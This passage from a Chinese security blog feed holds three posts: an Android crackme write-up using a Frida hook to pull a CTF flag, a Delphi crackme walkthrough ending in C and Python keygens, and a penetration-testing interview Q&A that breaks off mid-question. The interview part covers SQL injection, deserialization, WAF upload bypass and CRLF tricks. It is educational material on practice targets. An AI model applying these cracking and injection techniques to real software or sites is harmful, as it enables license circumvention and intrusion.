class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;flag是通过append将字符串以及Joseph（int,int）的返回值拼接构成的。</span><br><span class="line">String str &#x3D; &quot;DDCTF&#123;&quot;;</span><br><span class="line">str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, obj2, getRealParameter(new Object[]&#123;new Integer(5), new Integer(6)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, obj2, getRealParameter(new Object[]&#123;new Integer(7), new Integer(8)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">str &#x3D; &quot;&#125;&quot;;</span><br><span class="line">&#x2F;&#x2F;最终将我们输入的值与上面构造的equals比较，判断是否准确。</span><br><span class="line">if (((Boolean) EnhancedRobustUtils.invokeReflectMethod(&quot;equals&quot;, obj, getRealParameter(new Object[]&#123;str2&#125;), new Class[]&#123;Object.class&#125;, String.class)).booleanValue()) &#123;...&#125;</span><br></pre></td></tr></table></figure><p>通过上面的分析，可以发现hook有2个思路：</p><p>1.hook <code>EnhancedRobustUtils</code>类下的方法获取方法执行的返回值。<br>2.hook 动态加载的类<code>MainActivityPatch</code>的<code>Joseph</code>方法，直接调用它获取返回值。（下篇）</p><h2 id="代码构造"><a href="#代码构造" class="headerlink" title="代码构造"></a>代码构造</h2><p>先来看看EnhancedRobustUtils类下的方法<code>invokeReflectMethod</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static Object invokeReflectMethod(String methodName, Object targetObject, Object[] parameters, Class[] args, Class declaringClass) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;可以看到这里是通过反射的方法拿到类实例</span><br><span class="line">            Method method &#x3D; getDeclaredMethod(targetObject, methodName, args, declaringClass);</span><br><span class="line">            &#x2F;&#x2F;代入参数，调用方法</span><br><span class="line">            return method.invoke(targetObject, parameters);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        if (isThrowable) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;invokeReflectMethod error &quot; + methodName + &quot;   parameter   &quot; + parameters + &quot; targetObject &quot; + targetObject.toString() + &quot;  args  &quot; + args);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>invokeReflectConstruct</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public static Object invokeReflectConstruct(String className, Object[] parameter, Class[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;通过Class.forName(className)反射得到一个Class对象</span><br><span class="line">            Class clazz &#x3D; Class.forName(className);</span><br><span class="line">            &#x2F;&#x2F;获得构造器</span><br><span class="line">            Constructor constructor &#x3D; clazz.getDeclaredConstructor(args);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            &#x2F;&#x2F;返回该类的实例</span><br><span class="line">            return constructor.newInstance(parameter);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        if (isThrowable) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;invokeReflectConstruct error &quot; + className + &quot;   parameter   &quot; + parameter);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很简单，通过反射得到类的实例及方法，最终通过invoke代入参数执行方法。这里很幸运，我们发现这个EnhancedRobustUtils 是Robust自带的类，并不是动态加载的。<br>那hook就非常简单了，我们只需要简单的hook <code>invokeReflectMethod</code>获取Joseph的返回值，以及equals的参数即可。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105192047314.png" alt="image-20210105192047314"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">&#x2F;&#x2F;获得EnhancedRobustUtils类的wapper</span><br><span class="line">        var robust &#x3D; Java.use(&quot;com.meituan.robust.utils.EnhancedRobustUtils&quot;);</span><br><span class="line">&#x2F;&#x2F;hook invokeReflectMethod方法</span><br><span class="line">        robust.invokeReflectMethod.implementation &#x3D; function(v1,v2,v3,v4,v5)&#123;</span><br><span class="line">        &#x2F;&#x2F;不破坏原来的逻辑，只在原来的逻辑中打印出Joseph，equals的值</span><br><span class="line">            var result &#x3D; this.invokeReflectMethod(v1,v2,v3,v4,v5);</span><br><span class="line">            if(v1&#x3D;&#x3D;&quot;Joseph&quot;)&#123;</span><br><span class="line">                console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">                console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">                console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">                send(v4);</span><br><span class="line">                console.log(&quot;return:&quot;+result);</span><br><span class="line">                console.log(&quot;-----------------------------------------------------&quot;)</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            else if(v1&#x3D;&#x3D;&quot;equals&quot;)&#123;</span><br><span class="line">                console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">                console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">                console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">                send(v4);</span><br><span class="line">                console.log(&quot;return:&quot;+result);</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import frida,sys</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">var robust &#x3D; Java.use(&quot;com.meituan.robust.utils.EnhancedRobustUtils&quot;);</span><br><span class="line">robust.invokeReflectMethod.implementation &#x3D; function(v1,v2,v3,v4,v5)&#123;</span><br><span class="line">var result &#x3D; this.invokeReflectMethod(v1,v2,v3,v4,v5);</span><br><span class="line">if(v1&#x3D;&#x3D;&quot;Joseph&quot;)&#123;</span><br><span class="line">console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">send(v4);</span><br><span class="line">console.log(&quot;return:&quot;+result);</span><br><span class="line">console.log(&quot;-----------------------------------------------------&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else if(v1&#x3D;&#x3D;&quot;equals&quot;)&#123;</span><br><span class="line">console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">send(v4);</span><br><span class="line">console.log(&quot;return:&quot;+result);</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">session &#x3D; frida.get_usb_device().attach(&quot;cn.chaitin.geektan.crackme&quot;)</span><br><span class="line">script &#x3D; session.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;,on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>运行脚本 点击Onclick</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105200059163.png" alt="image-20210105200059163"></p><p>参考链接</p><p><a href="https://bbs.pediy.com/thread-229597.htm">https://bbs.pediy.com/thread-229597.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础环境&quot;&gt;&lt;a href=&quot;#基础环境&quot; class=&quot;headerlink&quot; title=&quot;基础环境&quot;&gt;&lt;/a&gt;基础环境&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>crackme-系列之-crackme4</title>
    <link href="http://www.ol4three.com/2021/01/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme4/"/>
    <id>http://www.ol4three.com/2021/01/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme4/</id>
    <published>2021-01-04T15:02:15.000Z</published>
    <updated>2021-01-04T15:24:36.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="首先进行查壳"><a href="#首先进行查壳" class="headerlink" title="首先进行查壳"></a>首先进行查壳</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230306003.png" alt="image-20210104230306003" style="zoom:50%;"><p>可以看到程序使用的Delphi编写的 没有加壳</p><h2 id="导出符号"><a href="#导出符号" class="headerlink" title="导出符号"></a>导出符号</h2><p>既然是delphi编写的 那么我们首先把他放到IDA里，把所有的关于Delphi的签名全部加上</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230428344.png" alt="image-20210104230428344"></p><p>ida会自动帮我们识别所有的Delphi的函数，可以看到添加签名之后 未识别的函数就只有那么一点点，剩下的都是库函数。</p><p>然后导出为MAP文件，导入到OD里(LoadMapEx)，可以极大的减轻负担。</p><h2 id="窗体分析"><a href="#窗体分析" class="headerlink" title="窗体分析"></a>窗体分析</h2><p>两个编辑框 一个图片显示框，据说是注册之后会显示一个朱茵的图片。没有按钮，没有提示</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230656046.png" alt="image-20210104230656046" style="zoom:50%;"><p>利用Delphi的反编译工具Darkde4进行查看</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230805587.png" alt="image-20210104230805587"></p><p>打开窗体部分，原来之前一直误以为的图片显示框是一个大按钮，这个按钮有两个对应事件， 分别是单击事件和双击事件</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230922854.png" alt="image-20210104230922854"></p><p>这里是整个程序的所有的响应事件 以及对应的RVA </p><blockquote><ul><li>第一个FormCreate是窗体的创建事件 这个不必关心，一般创建事件都是显示图形界面相关的操作 </li><li>第二个事件名是chkcode，全称应该是checkcode，校验代码，至于校验的是什么代码？不知道 </li><li>第三个KeyUp是响应的键盘的弹起 </li><li>第四个DbClick是按钮的双击事件 </li><li>第五个Click是按钮的单击事件 </li></ul></blockquote><p>那么思路和突破口也就有了，对应单击和双击事件的RVA 直接去OD分析两个响应事件的具体实现部分。</p><h2 id="OD分析"><a href="#OD分析" class="headerlink" title="OD分析"></a>OD分析</h2><p>在单击事件的RVA 0x00457B8处下断点，随便输入一组用户名，从上往下分析所有的执行过程。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231029614.png" alt="image-20210104231029614"></p><ol><li><p>获取用户名</p></li><li><p>获取用户名长度 将长度加上0x1E </p></li><li><p>将长度转为字符串 </p></li><li><p>字符串拼接 拼接为长度+用户名+循环次数 </p></li><li><p>整个算法循环18次 最后的结果如上图</p></li></ol><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231109372.png" alt="image-20210104231109372"></p><p>算法循环完了之后 比较[esi+0x30C]的值是否相等，如果不相等直接退出。如果相等，又是一轮重复的循环校验，接着提示注册成功。就是说前面的循环算法就是作者下的一个套，真正有用的部分就是这个比较，也就是[esi+0x30C] 的值必须是0x85。</p><p><strong>结论</strong></p><blockquote><p>[esi+0x30C] 的值必须是0x85。</p></blockquote><p><strong>双击事件</strong></p><p>通过Delphi的反编译工具Darkde4的过程窗口找到双击事件的RVA。下断点，分析。注意，在这之前必须取消单击事件的断点，否则无法断下来。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231321825.png" alt="image-20210104231321825"></p><p>还是同样的套路，一轮循环的验证之后，才来到真正有用的部分。 [esi+0x30C]和0x3E作比较，如果成立，就把[esi+0x30C]赋值为0x85，也就满足了单击事件的条件。 也就是说必定有一个地方，是把[esi+0x30C]赋值为0x3E。如果满足了这个条件，那么双击事件校验通过，单击事件 也通过。</p><p><strong>结论</strong></p><blockquote><p>[esi+0x30C]的值必须为0x3E</p></blockquote><p><strong>再次寻找突破口</strong></p><p>根据双击事件经验 我们能猜测，肯定有一个地方是把0x3E赋值给了[esi+0x30C]。 那么我们直接在OD中，右键-&gt;查找所有常量，输入3E，看看能不能找到mov [esi+0x30C],0x3E这样一条指令。如果能，那么这个就是真正校验的地方。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231438376.png" alt="image-20210104231438376"></p><p>拉到函数最上面</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231501583.png" alt="image-20210104231501583"></p><p>之前导入的IDA的注释显示这个是chkcode的校验事件。就是之前我们在Darkde4过程窗口里看到的checkcode的响应事件，这个应该就是真正的校验函数了。下断点，开始分析</p><p><strong>chcode事件</strong></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231540286.png" alt="image-20210104231540286"></p><p>首先获取用户名长度 然后将用户名长度+5，接着进行字符串拼接 拼接方式为黑头Sun Bird(用户名长度+5)dseloffc012-OK(用户名)，拼接好的字符串就是密码。</p><p><strong>结果</strong></p><p>接着输入用户名和序列号，根据之前的分析过程 我们需要先双击，再单击才能够校验成功</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231617223.png" alt="image-20210104231617223"></p><p>但是这里需要注意一点，在过程窗口中有一个KeyUp键盘弹起事件，在你输入序列号的时候 他会检测是否有键盘弹起，如果没有则不成功，这样做的目的是为了防止复制粘贴。破解的方法也很简单，在复制粘贴完序列号之后随便 按一个键(比如方向键 这样不会影响到输入结果)，接着双击再单击。可以看到，成功注册完成。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231703531.png" alt="image-20210104231703531" style="zoom:50%;"><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><blockquote><p>C</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot; </span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">    char key1[50] &#x3D; &quot;黑头Sun Bird&quot;; </span><br><span class="line">    char key2[50] &#x3D; &quot;dseloffc-012-OK&quot;; </span><br><span class="line">    char username[20] &#x3D; &#123; 0 &#125;; </span><br><span class="line">    printf(&quot;请输入用户名:&quot;); </span><br><span class="line">    scanf_s(&quot;%s&quot;, username, 20); </span><br><span class="line">    printf(&quot;序列号为:\n&quot;); </span><br><span class="line">    printf(&quot;%s%d%s%s\n&quot;, key1, strlen(username)+5, key2, username); </span><br><span class="line">    system(&quot;pause&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Python</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;please input username&quot;)</span><br><span class="line">s &#x3D; raw_input()</span><br><span class="line">print(&quot;黑头Sun Bird&quot; + str(len(s)+5) + &quot;dseloffc-012-OK&quot; + s)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231832620.png" alt="image-20210104231832620"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;首先进行查壳&quot;&gt;&lt;a href=&quot;#首先进行查壳&quot; class=&quot;headerlink&quot; title=&quot;首先进行查壳&quot;&gt;&lt;/a&gt;首先进行查壳&lt;/h2&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>2020 最新渗透测试⾯试题合集</title>
    <link href="http://www.ol4three.com/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/"/>
    <id>http://www.ol4three.com/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/</id>
    <published>2020-12-30T01:55:25.000Z</published>
    <updated>2020-12-30T02:22:54.214Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>⽹上整理的⾯试问题⼤全，有些 HW ⾯试的题，已经收集好了，提供给⼤家。现在就是毕业季节，希望各位都能找到好⼯作。</p></blockquote><h2 id="渗透篇"><a href="#渗透篇" class="headerlink" title="渗透篇"></a>渗透篇</h2><h4 id="1、介绍⼀下⾃认为有趣的挖洞经历"><a href="#1、介绍⼀下⾃认为有趣的挖洞经历" class="headerlink" title="1、介绍⼀下⾃认为有趣的挖洞经历"></a>1、介绍⼀下⾃认为有趣的挖洞经历</h4><p>挖洞也有分很多种类型，⼀种是以渗透、⼀种是以找漏洞为主，如果是前者会想各种办法获取权限继⽽获取想要的的东 </p><p>⻄完成渗透⽬标，这类跟 HW 类似，⽬标各种漏洞不算，要有 Shell，服务器权限才给分，这才是最接近实战渗透，跟某 </p><p>部⻔有合作的话也是属于这种打击⽹络犯罪获得权限、传销数据、组织架构，服务器权限、等……</p><h4 id="2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"><a href="#2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？" class="headerlink" title="2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"></a>2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？</h4><p>SQL 注⼊、密码组合, 前者防护分为⼏种，CDN -&gt; Web -&gt; 数据库 -&gt; 主机, 设置最⼩权限来应对。密码组合根据个⼈ </p><p>习惯</p><h4 id="3、php-java-反序列化漏洞的原理-解决⽅案"><a href="#3、php-java-反序列化漏洞的原理-解决⽅案" class="headerlink" title="3、php/java 反序列化漏洞的原理? 解决⽅案?"></a>3、php/java 反序列化漏洞的原理? 解决⽅案?</h4><p>php 中围绕着 serialize()，unserialize() 这两个函数，序列化就是把⼀个对象变成可以传输的字符串, 如果服务器能够接 </p><p>收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术⽅法⾥⾯的话，就容易造成很严重的漏洞 </p><p>了。</p><p>O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;} </p><p>这⾥的 O 代表存储的是对象（object）, 假如你给 serialize() 传⼊的是⼀个数组，那它会变成字⺟ a。7 表示对象的名称 </p><p>有 7 个字符。”chybeta” 表示对象的名称。1 表示有⼀个值。{s:4:”test”;s:3:”123”;} 中，s 表示字符串，4 表示该字符串的 </p><p>⻓度，”test” 为字符串的名称，之后的类似。当传给 unserialize() 的参数可控时，我们可以通过传⼊⼀个精⼼构造的序列 </p><p>化字符串 控 对象内部的变 甚 数化字符串，从⽽控制对象内部的变量甚⾄是函数。 </p><p>JAVA Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、⽂件、数据库中，ObjectOutputStream 类 </p><p>的 writeObject() ⽅法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类 </p><p>的 readObject() ⽅法⽤于反序列化。 </p><h4 id="4、如果⼀台服务器被⼊侵后-你会如何做应急响应"><a href="#4、如果⼀台服务器被⼊侵后-你会如何做应急响应" class="headerlink" title="4、如果⼀台服务器被⼊侵后, 你会如何做应急响应?"></a>4、如果⼀台服务器被⼊侵后, 你会如何做应急响应?</h4><ol><li><p>准备相关的⼯具，查后⻔等⼯具 </p></li><li><p>初步判断事件类型, 事件等级。 </p></li><li><p>抑制范围，隔离使受害⾯不继续扩⼤ </p></li><li><p>查找原因，封堵攻击源。 </p></li><li><p>业务恢复正常⽔平. </p></li><li><p>总结，报告，并修复、监控 </p></li></ol><p>以上是常规的回答，想知道你是否有这⽅⾯应急相关的经验，像这类问题甲⽅⾯试⽐较多。 </p><h4 id="5、你平时使⽤哪些⼯具-以及对应⼯具的特点"><a href="#5、你平时使⽤哪些⼯具-以及对应⼯具的特点" class="headerlink" title="5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?"></a>5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?</h4><p>AWVS、Masscan、BurpSuite </p><p>AWVS 常规漏洞扫描，masscan 快速查找端⼝，burp 重复提交数据包 </p><p>想知道是否有⾃⼰开发⼯具，如果没有你对每个安全⼯具有哪些独特的⻅解以及别⼈不知道的技巧⽤法。如：awvs 如何 </p><p>批量扫描？burpsuite 如何爆破 401､脱库等、等等… </p><h4 id="6、如果遇到-waf-的情况下如何进⾏-sql-注⼊-上传-Webshell-怎么做？请写出曾经绕过-WAF-的经过-SQLi，XSS，"><a href="#6、如果遇到-waf-的情况下如何进⾏-sql-注⼊-上传-Webshell-怎么做？请写出曾经绕过-WAF-的经过-SQLi，XSS，" class="headerlink" title="6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，"></a>6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，</h4><p>上传漏洞选⼀)PHP 上传，⽆法上传 php、解析、后台没有办法拿到，只有⼀处点可以上传。通过 Windows 特性 shell.php::$DATA， </p><p>是⼀个项⽬管理系统</p><h4 id="7、如何判断-sql-注⼊，有哪些⽅法"><a href="#7、如何判断-sql-注⼊，有哪些⽅法" class="headerlink" title="7、如何判断 sql 注⼊，有哪些⽅法"></a>7、如何判断 sql 注⼊，有哪些⽅法</h4><p>提交错误语句是否有异常，除此之外这些显示的错误可以通过 sleep, 修眠语句执⾏ 5 秒等，除此之外通过 DNSlog 判断 </p><p>是还有传回值 </p><h4 id="8、如何判断-SQL-注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？"><a href="#8、如何判断-SQL-注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？" class="headerlink" title="8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？"></a>8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？</h4><p>select * from news where id = ‘$SQL’; </p><p>当程序执⾏访问新闻等⼀些操作都会执⾏到 sql 语句进⾏调⽤，如果在此调⽤过程中，提交了不合法的数据，⽽数据库 </p><p>⽆法识别则会报错。也就是⼀切输⼊都是有害的。 </p><p>注⼊类型有 6 种，可以参考 SQLMAP，报错、盲注、联合、时间、内联、堆叠 </p><p>注⼊提交⽅式：GET、POST、Cookies、⽂件头 </p><p>利⽤⽅式：具体看什么数据库类型，像 SQLSERVER 可以命令执⾏，MYSQL 写 shell 有些权限⼤也可以执⾏命令但是 </p><p>条件是在 lINUX 环境下。 </p><p>防范: 边界, CDN -&gt; 脚本语⾔过滤 -&gt; 数据库过滤最⼩权限 -&gt; 主机 </p><h4 id="9、为什么有的时候没有错误回显"><a href="#9、为什么有的时候没有错误回显" class="headerlink" title="9、为什么有的时候没有错误回显"></a>9、为什么有的时候没有错误回显</h4><p>没有进⾏错误打印或者错误屏蔽 </p><h4 id="10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload-如何构造？"><a href="#10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload-如何构造？" class="headerlink" title="10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？"></a>10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？</h4><p>在 mysql 中使⽤了 gbk 编码，占⽤ 2 个字节, ⽽ mysql 的⼀种特性, GBK 是多字节编码，它认为两个字节就代表⼀个汉 </p><p>字，所以 %df 时候会和转义符 \ %5c 进⾏结合, 所以单引号就逃逸了出来, 当第⼀个字节的 ascii 码⼤于 128，就可以了。</p><h4 id="11、CRLF-注⼊的原理"><a href="#11、CRLF-注⼊的原理" class="headerlink" title="11、CRLF 注⼊的原理"></a>11、CRLF 注⼊的原理</h4><p>CRLF 注⼊在 OWASP ⾥⾯被称为 HTTP 拆分攻击（HTTP Splitting）CRLF 是” 回⻋ + 换⾏”（\r\n）的简称, 在 HTTP </p><p>协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显 </p><p>示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏ </p><h4 id="12、mysql-的⽹站注⼊，5-0-以上和-5-0-以下有什么区别？"><a href="#12、mysql-的⽹站注⼊，5-0-以上和-5-0-以下有什么区别？" class="headerlink" title="12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？"></a>12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？</h4><p>5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 </p><p>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操作。 </p><h4 id="13、php-ini-可以设置哪些安全特性"><a href="#13、php-ini-可以设置哪些安全特性" class="headerlink" title="13、php.ini 可以设置哪些安全特性"></a>13、php.ini 可以设置哪些安全特性</h4><p>禁⽤ PHP 函数 </p><p>允许 include 或打开访问远程资源 </p><h4 id="14、php-的-00-截断的原理是什么？"><a href="#14、php-的-00-截断的原理是什么？" class="headerlink" title="14、php 的 %00 截断的原理是什么？"></a>14、php 的 %00 